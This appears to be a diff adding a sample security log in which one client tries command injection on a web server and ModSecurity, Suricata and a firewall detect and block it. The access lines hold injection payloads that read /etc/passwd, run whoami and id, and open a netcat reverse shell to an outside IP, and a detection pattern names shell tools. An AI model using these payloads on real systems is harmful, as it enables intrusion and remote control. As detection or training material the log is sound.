@@ -1,0 +1,13 @@
+Feb 14 18:05:01 web01 apache2: 203.0.113.230 - - [14/Feb/2026:18:05:01 +0000] "GET /ping.php?ip=127.0.0.1;whoami HTTP/1.1" 500 812 "-" "Mozilla/5.0"
+Feb 14 18:05:02 web01 apache2: 203.0.113.230 - - [14/Feb/2026:18:05:02 +0000] "GET /status.php?host=localhost&&cat /etc/passwd HTTP/1.1" 500 920 "-" "Mozilla/5.0"
+Feb 14 18:05:03 web01 apache2: 203.0.113.230 - - [14/Feb/2026:18:05:03 +0000] "GET /admin.php?cmd=ls|nc 185.203.116.45 4444 -e /bin/sh HTTP/1.1" 500 1032 "-" "curl/7.68.0"
+Feb 14 18:05:04 web01 apache2: 203.0.113.230 - - [14/Feb/2026:18:05:04 +0000] "POST /execute HTTP/1.1" 500 640 "-" "Mozilla/5.0"
+Feb 14 18:05:05 web01 apache2: 203.0.113.230 - - [14/Feb/2026:18:05:05 +0000] "GET /test.php?input=$(id) HTTP/1.1" 500 700 "-" "Mozilla/5.0"
+
+Feb 14 18:05:06 web01 mod_security: [client 203.0.113.230] ModSecurity: Warning. Matched ";" in ARGS:ip. [file "/etc/modsecurity/rules.conf"] [id "932100"] [msg "Command Injection Attempt"] [severity "CRITICAL"]
+Feb 14 18:05:07 web01 mod_security: [client 203.0.113.230] ModSecurity: Warning. Pattern match "(?i:(?:cat|whoami|nc|bash|sh))" at ARGS:cmd. [id "932105"] [msg "Command Injection Payload Detected"]
+
+Feb 14 18:05:08 ids01 suricata[2650]: [1:2010939:5] ET WEB_SERVER Possible Command Injection Attempt [Classification: Web Application Attack] [Priority: 1] {TCP} 203.0.113.230:50511 -> 192.168.1.30:80
+Feb 14 18:05:09 ids01 suricata[2650]: [1:2022011:4] ET WEB_SERVER Reverse Shell Attempt [Classification: Web Application Attack] [Priority: 1] {TCP} 203.0.113.230:50512 -> 192.168.1.30:80
+
+Feb 14 18:05:10 firewall01 kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.230 DST=192.168.1.30 PROTO=TCP SPT=50515 DPT=80 SYN
